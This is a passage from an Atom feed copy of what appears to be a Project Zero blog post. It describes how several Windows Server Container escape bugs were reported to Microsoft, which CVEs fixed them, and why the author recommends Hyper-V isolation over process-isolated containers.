 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;I decided to report the registry symbolic link issue immediately, as I could argue that was something which would allow privilege escalation inside a container from a non-administrator. This would fit within the scope of a normal bug I&amp;rsquo;d find in Windows, it just required a special environment to function. This was &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=2120&quot;&gt;issue 2120&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which was fixed in February 2021 as &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-24096&quot;&gt;CVE-2021-24096&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. The fix was pretty straightforward, the call to &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;PsIsCurrentThreadInServerSilo &lt;/span&gt;&lt;span&gt;was removed as it was presumably redundant.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;The issue with &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;ContainerUser&lt;/span&gt;&lt;span&gt;&amp;nbsp;having &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;SeImpersonatePrivilege&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;could be by design. I couldn&amp;rsquo;t find any official Microsoft or Docker documentation describing the behavior so I was wary of reporting it. That would be like reporting that a normal service account has the privilege, which is by design. So I held off on reporting this issue until I had a better understanding of the security expectations.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;The situation with the other two silo escapes was more complicated as they explicitly crossed an undefended boundary. There was little point reporting them to Microsoft &lt;/span&gt;&lt;span&gt;if they &lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;wouldn&amp;rsquo;t be fixed. There would be more value in publicly releasing the information so that any users of the containers could try and find mitigating controls, or stop using Windows Server Container for anything where untrusted code could ever run.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;After much back and forth with various people in MSRC a decision was made. If a container escape works from a non-administrator user, basically if you can access resources outside of the container, then it would be considered a privilege escalation and therefore serviceable. This means that Daniel&amp;rsquo;s global symbolic link bug which kicked this all off still wouldn&amp;rsquo;t be eligible as it required SeTcbPrivilege which only administrators should be able to get. It might be fixed at some later point, but not as part of a bulletin.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;I reported the three other issues (the &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;ContainerUser &lt;/span&gt;&lt;span&gt;issue was also considered to be in scope) as &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=2127&quot;&gt;2127&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=2128&quot;&gt;2128&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=2129&quot;&gt;2129&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. These were all fixed in March 2021 as &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26891&quot;&gt;CVE-2021-26891&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26865&quot;&gt;CVE-2021-26865&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26864&quot;&gt;CVE-2021-26864&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;respectively.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Microsoft has not changed the MSRC servicing criteria at the time of writing. However, they will consider fixing any issue which on the surface &lt;/span&gt;&lt;span&gt;seems to escape a Windows Server Container &lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;but doesn&amp;rsquo;t require administrator privileges. It will be classed as an elevation of privilege.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;c12&quot; id=&quot;h.rqn8oqwagzde&quot;&gt;&lt;span class=&quot;c22 c34&quot;&gt;Conclusions&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;The decision by Microsoft to not support Windows Server Containers as a security boundary looks to be a valid one, as there&amp;rsquo;s just so much attack surface here. While I managed to get four issues fixed I doubt that they&amp;rsquo;re the only ones which could be discovered and exploited. Ideally you should never run untrusted workloads in a Windows Server Container, but then it also probably shouldn&amp;rsquo;t provide remotely accessible services either. The only realistic use case for them is for internally visible services with little to no interactions with the rest of the world. The official guidance for GKE is to not use Windows Server Containers in hostile multi-tenancy scenarios. This is covered in the GKE documentation &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://cloud.google.com/kubernetes-engine/docs/concepts/windows-server-gke&quot;&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;Obviously, the recommended approach is to use Hyper-V isolation. That moves the needle and Hyper-V is at least a supported security boundary. However container escapes are still useful as getting full access to the hosting VM could be quite important in any successful escape. Not everyone can run Hyper-V though, which is why GKE isn&amp;#39;t currently using it.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;</content><link rel='replies' type='application/atom+xml' href='https://googleprojectzero.blogspot.com/feeds/1279312763048126065/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='https://googleprojectzero.blogspot.com/2021/04/who-contains-containers.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/1279312763048126065'/><link rel='self' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/1279312763048126065'/><link rel='alternate' type='text/html' href='https://googleprojectzero.blogspot.com/2021/04/who-contains-containers.html' title='Who Contains the Containers?'/><author><name>Anonymous</name><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/blank.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggoaxszHhU8XtZZviy-QTmmvuPMOBrXBlZIaFN5XcItB-BObHVtxWwx5iIvVHSX3FCHHwuTyEgC8E4FqpvSdsMHhfjxtSA-jbVXTj628FgSAtuQXLDqEhoVMFRDKJf-SDLFkGgbx-hKlDO1gv8QIYmQjRoP1ISYIWz_0EQdsCTaT3QzAw0_DWo861z/s72-c/image1%20%283%29.png" height="72" width="72"/><thr:total>0</thr:total></entry>